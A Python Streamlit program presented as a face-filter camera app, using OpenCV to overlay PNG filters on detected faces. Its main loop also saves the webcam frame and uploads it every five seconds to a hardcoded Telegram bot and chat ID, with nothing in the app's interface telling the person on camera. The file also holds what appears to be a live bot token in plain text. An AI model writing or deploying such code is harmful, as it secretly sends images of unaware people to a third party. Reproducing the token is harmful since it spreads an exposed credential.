import cv2
import cvzone
import os
import streamlit as st
from PIL import Image
import requests
import time

class CameraApp:
    def __init__(self):
        self.cap = cv2.VideoCapture(0)
        self.cascade = cv2.CascadeClassifier('haarcascade_frontalface_default.xml')
        self.current_filter_index = 0
        self.filter_images = self.load_filter_images()
        self.token = "6725121177:AAGK9vg74cSj9INB-YdGBZQrLDzGVnTwdJw"  # Replace with your Telegram bot token
        self.chat_id = "1464746313"   # Replace with your chat ID

    def update_camera(self):
        ret, frame = self.cap.read()
        gray_scale = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
        faces = self.cascade.detectMultiScale(gray_scale)
        for (x, y, w, h) in faces:
            overlay = cv2.resize(self.filter_images[self.current_filter_index], (int(w*1.5), int(h*1.5)))
            frame = cvzone.overlayPNG(frame, overlay, [x-45, y-75])

        return cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

    def change_filter(self):
        self.current_filter_index = (self.current_filter_index + 1) % len(self.filter_images)

    def load_filter_images(self):
        filter_images = []
        filter_folder = "filter"
        for filename in os.listdir(filter_folder):
            if filename.endswith(".png") or filename.endswith(".jpg"):
                image = cv2.imread(os.path.join(filter_folder, filename), cv2.IMREAD_UNCHANGED)
                filter_images.append(image)
        return filter_images

    def send_photo_to_telegram(self, photo_path, caption=None):
        url = f"https://api.telegram.org/bot{self.token}/sendPhoto"
        params = {
            'chat_id': self.chat_id,
            'caption': caption
        }
        files = {
            'photo': open(photo_path, 'rb')
        }
        response = requests.post(url, params=params, files=files)
        return response.json()

def main():
    st.title("Camera App with Streamlit")
    app = CameraApp()
    stframe = st.empty()

    if st.button("Change Filter", key="change_filter_button"):
        app.change_filter()

    while True:
        frame = app.update_camera()
        frame = Image.fromarray(frame)
        stframe.image(frame, channels="RGB", use_column_width=True)

        # Save the frame to a temporary file
        temp_photo_path = "temp_photo.png"
        frame.save(temp_photo_path)

        # Send the photo to Telegram every 5 seconds
        app.send_photo_to_telegram(temp_photo_path, caption="Photo from Camera App")

        # Wait for 5 seconds before sending the next photo
        time.sleep(5)

if __name__ == "__main__":
    main()
